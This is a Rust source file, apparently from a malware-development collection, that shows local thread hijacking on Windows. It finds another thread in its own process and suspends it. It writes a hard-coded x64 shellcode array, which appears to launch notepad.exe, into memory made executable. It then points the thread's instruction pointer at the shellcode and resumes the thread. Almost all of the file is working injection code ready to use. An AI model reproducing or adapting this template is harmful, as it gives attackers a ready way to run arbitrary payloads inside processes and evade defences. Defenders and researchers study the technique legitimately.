/*
    Local Thread Hijacking
    For More Codes: https://github.com/Whitecat18/Rust-for-Malware-Development.git
    @5mukx
*/

use std::ptr::{copy_nonoverlapping, null_mut};

use winapi::{ctypes::c_void, 
    um::{errhandlingapi::GetLastError, 
        memoryapi::{VirtualAlloc, VirtualProtect}, 
        processthreadsapi::{CreateThread, GetCurrentProcessId, GetCurrentThreadId, GetThreadContext, OpenThread, ResumeThread, SetThreadContext, SuspendThread}, 
        synchapi::WaitForSingleObject, 
        tlhelp32::{CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32}, 
        winbase::CREATE_SUSPENDED, 
        winnt::{CONTEXT, CONTEXT_AMD64, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, THREAD_ALL_ACCESS}
    }
};

macro_rules! okey {
    ($msg:expr, $($arg:expr), *) => {
        println!("\\____[+] {}" , format!($msg, $($arg), *));
    }
}

macro_rules! error {
    ($msg:expr, $($arg:expr), *) => {
        println!("\\____[-] {}", format!($msg, $($arg), *));
        println!(" --Exiting--");
    }
}


fn find_thread()-> *mut c_void{
    unsafe{
        let process_pid = GetCurrentProcessId();
        let thread_pid = GetCurrentThreadId();

        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

        if snap.is_null(){
            error!("Failed to Create SnapShot: {}",GetLastError());       
            std::process::exit(0);
        }

        let mut thread: THREADENTRY32 = std::mem::zeroed();
        thread.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;

        if Thread32First(snap, &mut thread) > 0{
            loop {
                if thread.th32OwnerProcessID == process_pid && thread.th32ThreadID != thread_pid{
                    let h_thread = OpenThread(
                        THREAD_ALL_ACCESS, 
                        0,
                        thread.th32ThreadID
                    );

                    if h_thread.is_null(){
                        error!("Failed to open {}","Thread");
                        std::process::exit(0);
                    }
                    return h_thread;
                }

                if Thread32Next(snap, &mut thread) <= 0{
                    break;
                }
            }
        }    
    }
    null_mut()
}       
        
// Example of a function to create a thread
// unsafe extern "system" fn function(_param: *mut c_void) -> u32 {
//     let a = 1 + 1;
//     return a;
// }

#[allow(non_camel_case_types)]
#[repr(transparent)]
pub struct THREAD_CREATION_FLAGS(pub u32);

fn main(){

    let shellcode: [u8; 279] = [
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
        0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
        0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
        0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x6e, 0x6f, 0x74,
        0x65, 0x70, 0x61, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x00];

    unsafe{
        // Create Thread For Testing Purpose ...!
        // let hthread = CreateThread(
        //     null_mut(),
        //     0,
        //     Some(function), 
        //     null_mut(),
        //     CREATE_SUSPENDED as u32, 
        //     null_mut(),
        // );
        
        let hthread = find_thread();

        if hthread.is_null(){
            error!("Failed to Fetch the Thread, {:?}",hthread);
            return;
        }

        let address = VirtualAlloc(
            null_mut(), 
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_READWRITE,
        );

        okey!("VirtualAlloc Addr: {:?}",address);

        copy_nonoverlapping(shellcode.as_ptr(), address as *mut u8, shellcode.len());

        // let mut oldprotect: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);
        let mut oldprotect = 0;

        let protected = VirtualProtect(
            address, 
            shellcode.len(),
            PAGE_EXECUTE_READWRITE,
            &mut oldprotect,
        );

        if protected == 0{
            error!("VirtualProtect Failed with Error: {}", protected);
            return;
        }

        let mut ctx_thread: CONTEXT = std::mem::zeroed();
        ctx_thread.ContextFlags = 0 as u32;

        SuspendThread(hthread);

        println!();
        okey!("Retrieving thread context {}",'!');

        let get_thread = GetThreadContext(hthread, &mut ctx_thread);

        if get_thread == 0{
            error!("GetThreadContext Error: {}",GetLastError());
        }

        ctx_thread.Rip = address as u64;

        println!();
        okey!("Setting thread {}","context");

        let set_content = SetThreadContext(hthread, &ctx_thread);

        if set_content == 0{
            error!("SetThreadContext Error: {}",GetLastError());
            return;
        }

        okey!("Thread Executed{}",'!');

        ResumeThread(hthread);

        WaitForSingleObject(hthread, 0xFFFFFFFF);
    }
}

#[repr(transparent)]
#[allow(non_camel_case_types)]
pub struct PAGE_PROTECTION_FLAGS(pub u32);
#[repr(transparent)]
#[allow(non_camel_case_types)]
pub struct CONTEXT_FLAGS(pub u32);
// pub const CONTEXT_ALL_AMD64: CONTEXT_FLAGS;

